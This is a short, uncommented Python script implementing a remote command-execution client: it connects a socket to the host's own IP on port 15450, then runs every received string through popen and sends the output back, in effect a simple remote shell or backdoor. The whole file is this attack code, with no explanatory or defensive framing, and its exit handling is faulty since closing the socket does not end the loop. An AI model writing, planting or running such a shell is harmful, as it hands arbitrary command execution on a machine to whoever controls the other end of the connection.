import socket	
from os import popen

s = socket.socket()		
ip=(popen("hostname -I | awk '{print $1}'").read()).strip()
port = 15450			

s.connect((ip, port))

while True:
    cmd=s.recv(1024).decode()
    if cmd == "exit server":
        s.close()
    k=popen(cmd).read()
    s.sendall(k.encode())
